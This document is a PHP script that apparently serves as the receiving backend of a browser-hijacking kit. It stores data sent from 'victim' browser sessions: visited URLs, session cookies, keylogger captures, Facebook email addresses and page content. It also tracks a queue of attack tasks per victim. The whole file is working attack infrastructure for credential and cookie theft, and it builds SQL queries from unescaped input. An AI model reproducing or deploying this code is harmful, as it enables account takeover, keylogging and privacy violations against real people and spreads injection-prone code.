<?php

include_once("ui/config.php");

//print_r($_POST);
$session = session_id();

foreach($_POST as $key => $value){
	if($value != "" && $value != null && $value != false){
		$value = base64_decode($value);
		//$victim = mysql_query("SELECT * FROM user WHERE session = '".$session."' ORDER BY time DESC LIMIT 1");
		$victim = mysqli_query($con, "SELECT * FROM user WHERE session = '".$session."' ORDER BY time DESC LIMIT 1") or die(mysqli_error($con));
		//$do = mysql_fetch_object($victim)->do_;
		$do = mysqli_fetch_object($victim)->do_;
		
		switch($key){
			case "url":
				$url = $value;
				//mysql_query("INSERT INTO location (session, url, time) VALUES('".$session."', '".urldecode($url)."', '".time()."')");
				mysqli_query($con, "INSERT INTO location (session, url, time) VALUES('".$session."', '".urldecode($url)."', '".time()."')");
				break;
				
			case "cookies":
				$cookies = $value;
				//mysql_query("INSERT INTO location (session, url, time) VALUES('".$session."', '".urldecode($cookie)."', '".time()."')");
				mysqli_query($con, "INSERT INTO cookies (session, cookies, cookiesmd5, time) VALUES('".$session."', '".urldecode($cookies)."', '".md5(urldecode($cookies))."', '".time()."')");
				break;

			case "text":
				$text = $value;
				//mysql_query("INSERT INTO keylogger (session, time, content) VALUES('".$session."', '".time()."', '".urldecode($text)."')");
				mysqli_query($con, "INSERT INTO keylogger (session, time, content) VALUES('".$session."', '".time()."', '".urldecode($text)."')");
				break;
				
			case "fbmail":
				$mail = $value;
				$target = "facebook_check";
				
				//mysql_query("INSERT INTO data (time, session, key_, value_) VALUES('".time()."', '".$session."', 'fbmail', '".mysql_real_escape_string($mail)."')");
				mysqli_query($con, "INSERT INTO data (time, session, key_, value_) VALUES('".time()."', '".$session."', 'fbmail', '".mysqli_real_escape_string($con, $mail)."')") or die(mysqli_error($con));

				$tasks = unserialize($do);
				if(in_array($target, $tasks)){
					foreach($tasks as $key => $value){
						if($value == $target){
							unset($tasks[$key]);
							break;
						}
					}
					if(sizeof($tasks) != 0)
						$do = serialize(array_values($tasks));
					else
						$do = "wait";
					
					//mysql_query("UPDATE user SET do_ = '".$do."' WHERE session = '".$session."'");
					mysqli_query($con, "UPDATE user SET do_ = '".$do."' WHERE session = '".$session."'");
				}
				break;
			
			case "fbcontent":
				$content = trim(stripslashes($value));
				//$match = preg_match_all("/([_a-z0-9-]+(\.[_a-z0-9-]+)*\(\&\#064;|@)[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,4}))/isu", $content, $out);
				//if($match >= 1){
				//	//mysql_query("INSERT INTO data (time, session, key_, value_) VALUES('".time()."', '".$session."', 'fbcontentemail', '".mysql_real_escape_string($out[1][0])."')");
				//	mysqli_query($con, "INSERT INTO data (time, session, key_, value_) VALUES('".time()."', '".$session."', 'fbcontentemail', '".mysqli_real_escape_string($con, $out[1][0])."')");
				//}
				$c = base64_encode(gzencode($content, 9));
				//echo "test";
				//mysql_query("INSERT INTO data (time, session, key_, value_) VALUES('".time()."', '".$session."', 'fbcontent', '".$c."')");
				mysqli_query($con, "INSERT INTO data (time, session, key_, value_) VALUES('".time()."', '".$session."', 'fbcontent', '".$c."')") or die(mysqli_error($con));
				
				$tasks = unserialize($do);
				if(in_array($target, $tasks)){
					foreach($tasks as $key => $value){
						if($value == $target){
							unset($tasks[$key]);
							break;
						}
					}
					if(sizeof($tasks) != 0)
						$do = serialize(array_values($tasks));
					else
						$do = "wait";
					
					//mysql_query("UPDATE user SET do_ = '".$do."' WHERE session = '".$session."'");
					mysqli_query($con, "UPDATE user SET do_ = '".$do."' WHERE session = '".$session."'");
				}
				break;
				
			default:
				mysqli_query($con, "INSERT INTO data (time, session, key_, value_) VALUES('".time()."', '".$session."', '".$key."', '".mysqli_real_escape_string($con, $value)."')") or die(mysqli_error($con));
				break;
		}
		
		mysqli_free_result($victim);
	}
}
include("end.php");
?>